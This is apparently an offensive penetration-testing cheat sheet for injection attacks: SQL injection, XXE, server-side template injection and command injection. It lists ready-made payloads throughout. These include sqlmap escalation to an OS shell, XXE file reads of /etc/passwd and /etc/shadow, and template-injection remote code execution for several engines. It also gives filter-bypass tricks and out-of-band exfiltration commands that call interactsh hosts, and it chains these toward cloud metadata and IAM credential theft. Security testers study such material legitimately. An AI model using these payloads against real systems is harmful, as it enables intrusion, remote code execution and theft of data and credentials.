## Injection (SQLi, XXE, SSTI, Command Injection)

### SQL Injection

- **[Primary Probe]** `sqlmap -u "<url>" --level=5 --risk=3 --batch --dbs` on all numeric/UUID params
  - **[Signal: Error/time delay]** Dump schema, escalate to `--os-shell` if MySQL + FILE privilege
  - **[Dead End: WAF blocks union]** `--tamper=charunicodeescape,between,space2comment` or inline comments: `SELECT/**/1`, hex: `0x61646d696e`
  - **[Dead End: Numeric hardened]** Pivot to JSON body: `{"id": "1 OR SLEEP(5)--"}` (ORMs often skip JSON validation)
  - **[Dead End: No async timing]** Second-order: register `admin'--` → trigger profile fetch → DB error downstream
  - **[Data Chaining]** DB creds with FILE → `/etc/passwd` → hostname → SSRF target

### XXE (XML External Entity)

- **[Primary Probe]** Inject into XML body (SOAP, upload parsers, RSS):
  ```xml
  <?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
  ```
  - **[Signal: File echoed]** Escalate to `/proc/self/environ`, `/proc/net/fib_trie` for internal IPs
  - **[Dead End: No inline echo]** Blind XXE via OOB: `<!ENTITY % dtd SYSTEM "http://<interactsh>/x.dtd">` → interactsh-client DNS capture
  - **[Dead End: External entities blocked]** Try XInclude: `<xi:include href="file:///etc/passwd"/>` or SVG: `<svg><image href="file:///etc/shadow"/></svg>`
  - **[Dead End: Parser rejects external]** Malformed DTD for exception-based disclosure
  - **[Data Chaining]** OOB DNS confirms reachability → exfil `/etc/hosts` → internal hostnames → SSRF targets

### SSTI (Server-Side Template Injection)

- **[Primary Probe]** Inject into reflection points: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}` (name, subject, PDF, errors)
  - **[Signal: `49` reflected]** Fingerprint: `tplmap -u "https://target?name=INJECT"` → RCE per engine:
    - Jinja2: `{{''.__class__.__mro__.__subclasses__()[396]('id',shell=True).communicate()}}`
    - Freemarker: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
    - Smarty: `{php}echo shell_exec('id');{/php}`
  - **[Dead End: Math not evaluated]** Try logic: `{{'a'*10}}`, Mako: `${self.module.cache.util.os.system('id')}`
  - **[Dead End: Braces blocked]** Unicode or base64 decode gadgets
  - **[Data Chaining]** SSTI RCE → AWS metadata `169.254.169.254` → IAM creds → S3 enum

### Command Injection

- **[Primary Probe]** Inject into: `; id`, `` `id` ``, `$(id)`, `| id` (filenames, ping, image conversion, reports)
  - **[Signal: uid in response]** Blind OOB: `$(curl http://<interactsh>/$(whoami))`
  - **[Dead End: Semicolon/pipe blocked]** Newline: `%0aid`, IFS bypass: `i$IFS}d`
  - **[Dead End: All special chars stripped]** URL polyglot: `1%26%26id%261` or write via upload → trigger
  - **[Dead End: Async/no output]** DNS OOB: `` `host $(id).attacker.interactsh.com` `` via interactsh-client
